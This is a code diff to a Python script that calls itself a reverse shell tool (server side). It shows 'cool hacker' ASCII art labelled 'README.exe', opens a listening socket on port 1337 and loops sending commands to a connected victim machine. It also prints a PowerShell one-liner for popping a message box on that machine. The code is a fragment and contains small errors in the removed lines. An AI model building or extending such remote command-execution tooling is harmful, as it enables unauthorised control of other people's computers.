@@ -26,6 +26,7 @@ cool_Hacker_opening = """
       | ~~~~~~~~~~~ |
       | ~~~~~~~~~~~ |
       | ~~~~~~~~~~~ |
+      | ~~~~~~~~~~~ |
       .-------------.
         README.exe
 
@@ -33,9 +34,10 @@ cool_Hacker_opening = """
 
 print("\n\n\n\n\n\n\n\n"+cool_Hacker_opening)
 print("\n\n\nThe reverse shell tool (severside)\n\n")
+print("If you want to send a message to the person on the other end type:\nPowerShell -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Hello World')\"")
 #"0.0.0.0" is any ipv4 address the computer is listed as in any network
 host = "0.0.0.0"
-port = 5006
+port = 1337
 #buffer of 1024kb
 buffer = 1024
 
@@ -48,10 +50,6 @@ print(f"\nstarted listening on port {port}...")
 client_socket, client_addr = s.accept()
 
 print(f"connection made with {str(client_addr)}")
-
-message = "you are connected"
-conn.send(message.encode("acsii"))
-
 #this is the command execution part
 while True:
     #input and sending the command
